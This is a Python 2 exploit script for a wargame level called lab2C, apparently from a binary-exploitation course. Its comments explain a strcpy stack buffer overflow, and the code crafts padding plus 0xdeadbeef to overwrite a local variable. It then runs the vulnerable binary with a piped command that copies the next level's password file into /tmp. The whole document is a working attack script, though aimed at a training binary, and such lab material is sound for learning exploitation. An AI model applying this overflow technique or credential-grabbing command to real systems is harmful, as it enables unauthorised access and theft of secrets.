#!/urs/bin/python
# coding: utf-8


'''
Exploit for level lab2C
'''

import os
import struct


#   Behaviour: This level takes a single argument in the command line.
# Then copies that string into a local variable (with strcpy) without
# checking lengths. Then compares a local var called set_me with 0xdeadbeef
# If equal, promts the user with a shell; if not, terminates it execution.

# In this level we can exploit the buffer overflow vulnerability to access
# and modify the value of the local var set_me to 0xdeadbeef and gain a shell.

# Basically we have to craft a string that, when copied, overflows the buffer
# and overwrites the value of set_me with 0xdeadbeef.

# Disassembling the file we can see that the buffer is located at [esp+0x1d]
# and set_me is at [esp+0x2c], this means that an overwrite by overflow is
# possible: we just need to pad the string with (0x2c-0x1d) bytes and then
# put the new value of set_me.

crafted = "A"*(0x2c - 0x1d) + struct.pack('<I', 0xdeadbeef)  # Little-endian

cmd = 'python -c \'print "%s"\'' % crafted
os.system('(echo "cat /home/lab2B/.pass > /tmp/lab2B.pass") | ' +
          '/levels/lab02/lab2C $(%s)' % cmd)
print '[+] Password stored in /tmp/lab2B.pass'
